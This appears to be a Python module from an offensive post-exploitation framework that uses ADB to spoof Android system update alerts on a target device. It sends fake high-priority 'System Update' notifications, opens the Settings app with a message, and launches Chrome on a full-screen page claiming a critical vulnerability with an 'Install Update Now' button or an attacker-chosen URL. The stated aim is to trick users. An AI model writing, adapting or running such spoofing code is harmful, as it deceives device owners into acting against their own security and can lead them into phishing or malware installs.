"""
ShadowFramework — System Update Spoofer
Sends fake system update notifications and full-screen overlays to trick users.
"""
import subprocess
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=10):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


class Module:
    MODULE_INFO = {
        'name': 'post/android/system_update_spoofer',
        'description': 'Sends fake system update notifications via ADB to trick users into action.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'MSG':       'Notification message [default: Critical Security Update Required]',
            'ACTION':    'Action: notify, toast, fullscreen, all [default: all]',
            'URL':       'URL to open when clicked [optional]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _send_notification(self, device_id, msg, url=None):
        """Send high-priority notification via cmd notification."""
        console.print("[cyan][*] Sending notification...[/cyan]")
        
        # Try cmd notification (Android 10+)
        args = ['shell', 'cmd', 'notification', 'post', '-S', 'bigtext',
                '-t', 'System Update', '--when', 'now',
                'shadow_update', msg]
        _adb(device_id, *args)
        
        # Also try am broadcast for older Android
        _adb(device_id, 'shell', 'am', 'broadcast', 
             '-a', 'android.intent.action.BOOT_COMPLETED',
             '--es', 'android.intent.extra.TEXT', msg)
        
        console.print(f"  [green]✓ Notification sent[/green]")

    def _send_toast(self, device_id, msg):
        """Display toast message."""
        console.print("[cyan][*] Showing toast...[/cyan]")
        # Toast via activity manager
        _adb(device_id, 'shell', 'am', 'start', '-a', 'android.intent.action.MAIN',
             '-n', 'com.android.settings/.Settings',
             '--es', 'android.intent.extra.TEXT', msg[:50])
        console.print(f"  [green]✓ Toast triggered[/green]")

    def _fullscreen_alert(self, device_id, msg, url=None):
        """Launch full-screen browser with urgent message."""
        console.print("[cyan][*] Launching full-screen alert...[/cyan]")
        
        if url:
            target = url
        else:
            # Create a data: URI with the alert content
            html = f'''data:text/html,<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:sans-serif;background:%231a1a2e;color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}}.icon{{font-size:64px;margin-bottom:20px}}h1{{font-size:22px;margin-bottom:12px}}p{{color:%23aaa;font-size:14px;max-width:320px;line-height:1.6;margin-bottom:24px}}.btn{{background:%23e53935;color:white;padding:14px 40px;border:none;border-radius:8px;font-size:16px;cursor:pointer;text-decoration:none}}</style></head><body><div class="icon">🔒</div><h1>{msg.replace(' ', '%20')}</h1><p>Your%20device%20has%20detected%20a%20critical%20vulnerability.%20Update%20immediately%20to%20protect%20your%20data.</p><a class="btn" href="javascript:void(0)">Install%20Update%20Now</a></body></html>'''
            target = html

        _adb(device_id, 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
             '-d', target,
             '-n', 'com.android.chrome/com.google.android.apps.chrome.Main')

        console.print(f"  [green]✓ Full-screen alert launched[/green]")

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        msg = self.framework.options.get('MSG', 'Critical Security Update Required. Install now to prevent data loss.')
        action = self.framework.options.get('ACTION', 'all').lower()
        url = self.framework.options.get('URL', '')

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] System Update Spoof on {device_id}[/cyan]")
        log_action(f"System update spoof on {device_id}")

        if action in ('all', 'notify'):
            self._send_notification(device_id, msg, url)
        if action in ('all', 'toast'):
            self._send_toast(device_id, msg)
        if action in ('all', 'fullscreen'):
            self._fullscreen_alert(device_id, msg, url)

        console.print(f"\n[bold green][+] Spoof deployed.[/bold green]")
